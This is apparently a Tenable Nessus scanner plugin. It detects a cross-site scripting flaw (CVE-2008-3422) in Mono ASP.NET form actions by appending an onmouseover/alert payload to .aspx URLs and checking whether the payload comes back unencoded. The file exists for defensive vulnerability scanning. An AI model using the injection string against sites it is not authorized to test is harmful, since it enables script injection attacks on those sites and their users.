#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35556);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2008-3422");
  script_bugtraq_id(30471);
  script_osvdb_id(47563);
  script_xref(name:"Secunia", value:"31338");

  script_name(english:"Mono ASP.NET action Attribute XSS");
  script_summary(english:"Tries to inject XSS using Mono's 'action' attribute");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a development framework that is
affected by a cross-site scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Mono, an open source, UNIX implementation
of the Microsoft .NET development platform. 

The version of Mono installed on the remote host fails to encode
user-supplied input to the URL before using it for the default
'action' of a form.  An attacker may be able to leverage this to
inject arbitrary HTML and script code into a user's browser to be
executed within the security context of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://lists.ximian.com/pipermail/mono-devel-list/2008-July/028633.html" );
 script_set_attribute(attribute:"see_also", value:"https://bugzilla.novell.com/show_bug.cgi?id=413534" );
 script_set_attribute(attribute:"see_also", value:"http://permalink.gmane.org/gmane.comp.security.oss.general/741" );
 script_set_attribute(attribute:"see_also", value:"http://www.mono-project.com/Vulnerabilities" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Mono version 2.0 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(79);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/01/30");
 script_cvs_date("$Date: 2015/10/13 15:19:33 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:mono:mono");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


exploit = string('"onmouseover="window.alert(', "'", SCRIPT_NAME, "'", ');"');
max_files = 20;                         # nb: doesn't apply if the "Perform thorough tests" setting is enabled.


files = get_kb_list(string("www/", port, "/content/extensions/aspx"));
if (isnull(files)) files = make_list("/index.aspx", "/Default.aspx");

n = 0;
foreach file (files)
{
  ++n;

  # Look for a form that calls itself.
  res = http_send_recv3(method:"GET", item:file, port:port);
  if (res == NULL) exit(0);

  base = file;
  while ("/" >< base && strlen(base) > 1)
    base = strstr(base, "/") - "/";

  if (
    '<input type="hidden" name="__VIEWSTATE"' >< res[2] &&
    string('method="post" action="', base, '"') >< res[2]
  )
  {
    url = string(file, "?", exploit);
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (res == NULL) exit(0);

    if (string('method="post" action="', base, '?', exploit, '"') >< res[2])
    {
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to exploit the issue using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n",
          "\n",
          "NB: to test this, you will need to use Internet Explorer and move\n",
          "the mouse over the form.\n"
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
    }

    exit(0);
  }

  if (!thorough_tests && n > max_files) break;
}
